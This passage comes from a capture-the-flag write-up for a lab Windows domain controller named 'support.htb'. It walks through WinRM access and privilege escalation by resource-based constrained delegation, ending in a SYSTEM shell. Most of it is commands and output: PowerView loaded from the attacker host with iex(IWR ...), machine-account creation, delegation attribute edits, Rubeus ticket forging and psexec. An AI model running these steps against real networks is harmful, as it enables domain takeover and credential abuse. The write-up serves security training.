+<span class="n">HTTP</span>        <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span>    <span class="mi">5985</span>   <span class="n">DC</span>               <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span><span class="p">:</span><span class="mi">5985</span><span class="o">/</span><span class="n">wsman</span>
+<span class="n">WINRM</span>       <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.174</span>    <span class="mi">5985</span>   <span class="n">DC</span>               <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">support</span><span class="p">.</span><span class="n">htb</span>\<span class="n">support</span><span class="p">:</span><span class="nc">Ironside47pleasure40Watchful </span><span class="p">(</span><span class="n">Pwn3d</span><span class="err">!</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>WE have valid credentials <code class="language-plaintext highlighter-rouge">support:Ironside47pleasure40Watchful</code> .</p>
+
+<p>Since this new user is part of the remote management users we can remotely to the machine.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~/machines/windows/support</span><span class="p">]</span><span class="w">
+</span><span class="err">└─$</span><span class="w"> </span><span class="n">evil</span><span class="nt">-winrm</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="nf">11</span><span class="o">.</span><span class="nf">174</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s1">'support'</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s1">'Ironside47pleasure40Watchful'</span><span class="w">
+                                        
+</span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">v3.</span><span class="mi">5</span><span class="w">
+                                        
+</span><span class="n">Warning</span><span class="p">:</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">completions</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">disabled</span><span class="w"> </span><span class="n">due</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">ruby</span><span class="w"> </span><span class="n">limitation</span><span class="p">:</span><span class="w"> </span><span class="n">quoting_detection_proc</span><span class="p">()</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">unimplemented</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">machine</span><span class="w">
+                                        
+</span><span class="n">Data</span><span class="p">:</span><span class="w"> </span><span class="n">For</span><span class="w"> </span><span class="n">more</span><span class="w"> </span><span class="n">information</span><span class="p">,</span><span class="w"> </span><span class="n">check</span><span class="w"> </span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="w"> </span><span class="n">GitHub</span><span class="p">:</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="n">//github.com/Hackplayers/evil-winrm</span><span class="c">#Remote-path-completion</span><span class="w">
+                                        
+</span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">Establishing</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="n">endpoint</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="n">C:\Users\support\Documents</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<p>Checking the groups of our owned user, we can see that are part of Shared Support Accounts. If we use bloodhound to enumerate de domain, we will see that members of this group have the right GenericAll over the DC.</p>
+
+<p><img src="Support%20ea09600bc5824f3b843ad072ab8355d3/Untitled.png" alt="Untitled" /></p>
+
+<p>This let us perform a <strong>Resource Based Constrained Delegation</strong>.</p>
+
+<p>This attack allow us to impersonate any user of the domain in the machine we have privilege to write on. In this attack we will modify a constrain in the DC which will allow a new machine account created by us to impersonate any user we want in the DC.</p>
+
+<p>First we import the necessary modules.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\support\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">IWR</span><span class="w"> </span><span class="nx">http://10.10.14.4/PowerView.ps1</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="p">)</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\support\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">IWR</span><span class="w"> </span><span class="nx">http://10.10.14.4/Powermad.ps1</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Now we create the machine and retrieve its SID.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\support\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">New-MachineAccount</span><span class="w"> </span><span class="nt">-MachineAccount</span><span class="w"> </span><span class="nx">attackersystem</span><span class="w"> </span><span class="nt">-Password</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Summer2018!'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">)</span><span class="w">
+</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Machine</span><span class="w"> </span><span class="nx">account</span><span class="w"> </span><span class="nx">attackersystem</span><span class="w"> </span><span class="nx">added</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\support\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$ComputerSid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="nx">attackersystem</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">objectsid</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nt">-Expand</span><span class="w"> </span><span class="nx">objectsid</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Now we prepare the statements to enable the impersonation in the DC.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">support</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="err">$</span><span class="n">SD</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">RawSecurityDescriptor</span> <span class="o">-</span><span class="n">ArgumentList</span> <span class="sh">"</span><span class="s">O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))</span><span class="sh">"</span>
+<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">support</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="err">$</span><span class="n">SDBytes</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="err">$</span><span class="n">SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">)</span>
+<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">support</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="err">$</span><span class="n">SD</span><span class="p">.</span><span class="nc">GetBinaryForm</span><span class="p">(</span><span class="err">$</span><span class="n">SDBytes</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now we modify the constrain <strong>msds-allowedtoactonbehalfofotheridentity</strong> to allow our new machine account to impersonate any user in the machine we have write privilege writes on.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">support</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="err">$</span><span class="n">TargetComputer</span><span class="o">=</span><span class="sh">"</span><span class="s">DC</span><span class="sh">"</span>
+<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">support</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">Get</span><span class="o">-</span><span class="n">DomainComputer</span> <span class="err">$</span><span class="n">TargetComputer</span> <span class="o">|</span> <span class="n">Set</span><span class="o">-</span><span class="n">DomainObject</span> <span class="o">-</span><span class="n">Set</span> <span class="o">@</span><span class="p">{</span><span class="sh">'</span><span class="s">msds-allowedtoactonbehalfofotheridentity</span><span class="sh">'</span><span class="o">=</span><span class="err">$</span><span class="n">SDBytes</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p>Once all this is done we will request a Silver ticket for the service we want in the machine we are taking over.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\rubeus.exe</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="nx">/password:Summer2018</span><span class="o">!</span><span class="w">
+</span><span class="o">.</span><span class="n">\rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:attackersystem</span><span class="err">$</span><span class="w"> </span><span class="nx">/rc4:EF266C6B963C0BB683941032008AD47F</span><span class="w"> </span><span class="nx">/impersonateuser:administrator</span><span class="w"> </span><span class="nx">/msdsspn:cifs/dc.support.htb</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Impersonating</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="s1">'administrator'</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">SPN</span><span class="w"> </span><span class="s1">'cifs/dc.support.htb'</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Building</span><span class="w"> </span><span class="nx">S4U2proxy</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">service:</span><span class="w"> </span><span class="s1">'cifs/dc.support.htb'</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="kr">Using</span><span class="w"> </span><span class="n">domain</span><span class="w"> </span><span class="nx">controller:</span><span class="w"> </span><span class="nx">dc.support.htb</span><span class="w"> </span><span class="p">(::</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Sending</span><span class="w"> </span><span class="nx">S4U2proxy</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">controller</span><span class="w"> </span><span class="p">::</span><span class="nx">1:88</span><span class="w">
+</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">S4U2proxy</span><span class="w"> </span><span class="nx">success</span><span class="o">!</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">base64</span><span class="p">(</span><span class="n">ticket.kirbi</span><span class="p">)</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">SPN</span><span class="w"> </span><span class="s1">'cifs/dc.support.htb'</span><span class="p">:</span><span class="w">
+
+      </span><span class="n">doIGcDCCBmygAwIBBaEDAgEWooIFgjCCBX5hggV6MIIFdqADAgEFoQ0bC1NVUFBPUlQuSFRCoiEwH6AD</span><span class="w">
+      </span><span class="nx">AgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGKjggU7MIIFN6ADAgESoQMCAQWiggUpBIIFJXz46wSX</span><span class="w">
+      </span><span class="n">dJ528nhTzvK08JWJGBIZSwb0rLQNfXwOIQXANBIkYd2JVdV4TcBbP2RITZMk9Pur7QyBNtOHWhuzO/Qv</span><span class="w">
+      </span><span class="nx">PSyzt1nk/74x3HPcc</span><span class="o">+</span><span class="nx">KQlwbf0N5/7PRMkc0wSf2r5BTkLv30xpWRnSqwlvNBvQJxaJdSXZot1VPmcsC3</span><span class="w">
+      </span><span class="n">A6GSkGxXHlrV/B1lO61JEd95fp8gN4Kcu0feEeHLtI/2U4bEcToSsa1EM4QIDQHaHPEDbl</span><span class="o">+</span><span class="nx">FKSUiwFi8</span><span class="w">
+      </span><span class="n">f</span><span class="o">+</span><span class="nx">FeQmCELz8Gu</span><span class="o">++</span><span class="nx">33kmI</span><span class="o">+</span><span class="nx">hESNhHWZuipSZemCaXidpf0RLc4UvCHF/mUNWdKltsQ3IpKaMDbcQ6FYcTA</span><span class="w">
+      </span><span class="n">npixO58qFzXgHwIrolk5WvYXW/Rf7OIhXaeJsu23LHO/i1pldcXDX359op</span><span class="o">+</span><span class="nx">aUphx4FPJMnQrzR/7LkXj</span><span class="w">
+      </span><span class="n">NHk2qur2clmCO3jwerH0iOTxKK</span><span class="o">+</span><span class="nx">/GOw9SlNThVdVlcbHfR2UR54R7Lrr9EUhZ5E2xWvVJGRKpMdH9X7P</span><span class="w">
+      </span><span class="n">dzylSvw0</span><span class="o">+</span><span class="nx">Ez2/cB/O3dvreVkfsghmc58obZzxt9HK</span><span class="o">+</span><span class="nx">TIvkqEp0Fg0Gl</span><span class="o">+</span><span class="nx">FqGL/MhTNGGSPx9s9eh5ywCC</span><span class="w">
+      </span><span class="n">Hu9m</span><span class="o">+</span><span class="nx">aF2pAq4oS8TbQFg3apcfQoZR</span><span class="o">+</span><span class="nx">59RS4yiQ8mOqTZrsjRK</span><span class="o">+</span><span class="nx">0hsCGpgoxCZmxWvbcVJL</span><span class="o">+</span><span class="nx">uwg0A8JYX</span><span class="w">
+      </span><span class="n">LJeVGGZXh8bkh90OK</span><span class="o">+</span><span class="nx">opToXopq0QnYRqZP9U</span><span class="o">+</span><span class="nx">TF0vmXUJf3iORiVyWx3NdG8pTFAgxPWykQXVbo5vaaM</span><span class="w">
+      </span><span class="mi">1</span><span class="n">DDpDdkokGXNwZs2Xtxe0AK6Ah0LaSnIwgTqnT4kUrASPEDZAbfXOInufKMCheOLLD3UbNtk6oydkc4/</span><span class="w">
+      </span><span class="nx">2alEcNP61CJETbKw</span><span class="o">+</span><span class="nx">zNaTZxOlurDnJZbIFbdtObctA0h6FgBcdrkhmXgNZjW9g9761KL0Ed/AefJq5GI</span><span class="w">
+      </span><span class="n">opvh22R3dwA8syyrA</span><span class="o">+</span><span class="nx">jv9J35bqwnvoJ41aHXZXVIcccM3iK46LKm5xeMFWmuvX8R7MT5ZT7hdOGJFUkQ</span><span class="w">
+      </span><span class="n">KD</span><span class="o">+</span><span class="nx">OKS0WNSZSKIa7GrdyTYZ/smx</span><span class="o">+</span><span class="nx">9jgD2R5OEK57h2jpIiLwZI3VLXb0B2CjyTt78VQYKNkLd7J97Y9R</span><span class="w">
+      </span><span class="mi">9</span><span class="n">KGShK00pVaw2Lr7q4gnwNM9DudVEPY</span><span class="o">+</span><span class="nx">RVUeRnESTB8kFqfX8hUK6eps1Bism8XCbrVghRIhlXQGgpxe</span><span class="w">
+      </span><span class="n">l98hsR56Id5UHarRTHljLG7mt1bvI75db4RG1CpBnbUwpalZQ</span><span class="o">+</span><span class="nx">onYM0</span><span class="o">+</span><span class="nx">lSOsMvMB54/9ttnvqKSVt0OI</span><span class="w">
+      </span><span class="n">cyqQg8ZrDNJakMCkaHf</span><span class="o">+</span><span class="nx">ZFBSBj/KmwGPw83EL1UDS5cn/tSNeLh/7L7C7aNyJQ</span><span class="o">+</span><span class="nx">tfPCPuuYj9EkEOnff</span><span class="w">
+      </span><span class="o">+</span><span class="n">/4O5etPrkkPO6ggO9lA8e32xFaBNgyhIRGVcL/titvUsZxPhk1nnIHLhlYY0jlBb</span><span class="o">+</span><span class="nx">KuCG</span><span class="o">+</span><span class="nx">UiFQDvUIj</span><span class="w">
+      </span><span class="mi">6</span><span class="n">MM/SVW0hpTiX8BIy</span><span class="o">+</span><span class="nx">vlwBgZxH</span><span class="o">+</span><span class="nx">MruoJfjZd44PqPYfuj98bJWpqQ0uMx0P/lUcfcMLg6frTemEdkHp6</span><span class="w">
+      </span><span class="mi">4</span><span class="n">HYj09M9WqcZO3v8sXjdg3sU6Zul0pr9/HjcIdODPZhfEJqcaroUKfsbvf1l4AlIHrDf1D/ufC8itf9A</span><span class="w">
+      </span><span class="nx">rPO0lxqBsOI1cgAOjGnCf1dAN7cHhHFjAj783hvn6ohfS7IEdp/vVxwyDFoCh95M53iEC0hmCycjEbvJ</span><span class="w">
+      </span><span class="n">b8S</span><span class="o">+</span><span class="nx">w1OTZqi/eDdq5Pi4aum8Ge6o8H4AaCLZGpVTXfo1e8qgvV7wBLMqwbYLMilHGH2fsm</span><span class="o">+</span><span class="nx">cFT10HgeH</span><span class="w">
+      </span><span class="n">LtsFukDebHUFDi4FTsuFjKW265EMdlpmyibAfcyCs8nVXWqMWxHdqjYqN</span><span class="o">++</span><span class="nx">jF1IImO5Q3aOB2TCB1qAD</span><span class="w">
+      </span><span class="n">AgEAooHOBIHLfYHIMIHFoIHCMIG/MIG8oBswGaADAgERoRIEEOagwekJV7KqMnH96KZe1ymhDRsLU1VQ</span><span class="w">
+      </span><span class="nx">UE9SVC5IVEKiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJhdG9yowcDBQBApQAApREYDzIwMjMxMTI5MTE1</span><span class="w">
+      </span><span class="n">NjA4WqYRGA8yMDIzMTEyOTIxNTYwOFqnERgPMjAyMzEyMDYxMTU2MDhaqA0bC1NVUFBPUlQuSFRCqSEw</span><span class="w">
+      </span><span class="nx">H6ADAgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGI</span><span class="o">=</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\support\Documents</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Now back in out attacking machine we have to convert the ticket to one that can be used with impacket suite.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~/machines/windows/support</span><span class="p">]</span><span class="w">
+</span><span class="err">└─$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">aux.ticket</span><span class="o">|</span><span class="w"> </span><span class="n">tr</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="s1">' '</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">tr</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="s1">'\n'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">base64</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="n">admin.ticket</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~/machines/windows/support</span><span class="p">]</span><span class="w">
+</span><span class="err">└─$</span><span class="w"> </span><span class="n">impacket</span><span class="nt">-ticketConverter</span><span class="w"> </span><span class="n">admin.ticket</span><span class="w"> </span><span class="n">admin.ccache</span><span class="w">                
+</span><span class="n">Impacket</span><span class="w"> </span><span class="n">v0.</span><span class="mf">10.0</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Copyright</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="n">SecureAuth</span><span class="w"> </span><span class="n">Corporation</span><span class="w">
+
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">converting</span><span class="w"> </span><span class="n">kirbi</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">ccache.</span><span class="o">..</span><span class="w">
+</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">done</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Now we should be able to user psexec to obtain a shell.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~/machines/windows/support</span><span class="p">]</span><span class="w">
+</span><span class="err">└─$</span><span class="w"> </span><span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">admin.ccache</span><span class="w"> </span><span class="n">impacket</span><span class="nt">-psexec</span><span class="w"> </span><span class="n">support.htb/Administrator</span><span class="err">@</span><span class="nx">DC</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nt">-no-pass</span><span class="w">
+</span><span class="n">Impacket</span><span class="w"> </span><span class="n">v0.</span><span class="mf">10.0</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Copyright</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="n">SecureAuth</span><span class="w"> </span><span class="n">Corporation</span><span class="w">
+
+</span><span class="p">[</span><span class="o">-</span><span class="p">]</span><span class="w"> </span><span class="n">Kerberos</span><span class="w"> </span><span class="n">SessionError</span><span class="p">:</span><span class="w"> </span><span class="n">KDC_ERR_PREAUTH_FAILED</span><span class="p">(</span><span class="n">Pre</span><span class="nt">-authentication</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">invalid</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The reason why this has failed is because we didn’t specify the correct name when requesting the ticket.</p>
+
+<ul>
+  <li>Bad → cifs/dc.support.htb</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:attackersystem</span><span class="err">$</span><span class="w"> </span><span class="nx">/rc4:EF266C6B963C0BB683941032008AD47F</span><span class="w"> </span><span class="nx">/impersonateuser:administrator</span><span class="w"> </span><span class="nx">/msdsspn:cifs/dc.support.htb</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Correct → cifs/DC</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:attackersystem</span><span class="err">$</span><span class="w"> </span><span class="nx">/rc4:EF266C6B963C0BB683941032008AD47F</span><span class="w"> </span><span class="nx">/impersonateuser:administrator</span><span class="w"> </span><span class="nx">/msdsspn:cifs/DC</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Now we have the shell.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~/machines/windows/support</span><span class="p">]</span><span class="w">
+</span><span class="err">└─$</span><span class="w"> </span><span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">admin.ccache</span><span class="w"> </span><span class="n">impacket</span><span class="nt">-psexec</span><span class="w"> </span><span class="n">support.htb/Administrator</span><span class="err">@</span><span class="nx">DC</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nt">-no-pass</span><span class="w">
+</span><span class="n">Impacket</span><span class="w"> </span><span class="n">v0.</span><span class="mf">10.0</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Copyright</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="n">SecureAuth</span><span class="w"> </span><span class="n">Corporation</span><span class="w">
+
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Requesting</span><span class="w"> </span><span class="n">shares</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">DC.</span><span class="o">....</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Found</span><span class="w"> </span><span class="n">writable</span><span class="w"> </span><span class="n">share</span><span class="w"> </span><span class="n">ADMIN</span><span class="err">$</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Uploading</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">SUcDRXed.exe</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Opening</span><span class="w"> </span><span class="n">SVCManager</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">DC.</span><span class="o">....</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Creating</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">lBKn</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">DC.</span><span class="o">....</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Starting</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">lBKn.</span><span class="o">....</span><span class="w">
+</span><span class="p">[</span><span class="o">!</span><span class="p">]</span><span class="w"> </span><span class="n">Press</span><span class="w"> </span><span class="n">help</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">extra</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">commands</span><span class="w">
+</span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="p">[</span><span class="n">Version</span><span class="w"> </span><span class="mf">10.0</span><span class="o">.</span><span class="nf">20348</span><span class="o">.</span><span class="nf">859</span><span class="p">]</span><span class="w">
+</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Corporation.</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">rights</span><span class="w"> </span><span class="nx">reserved.</span><span class="w">
+
+</span><span class="n">C:\Windows\system32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
+</span><span class="n">nt</span><span class="w"> </span><span class="n">authority\system</span><span class="w">
+
+</span><span class="n">C:\Windows\system32</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
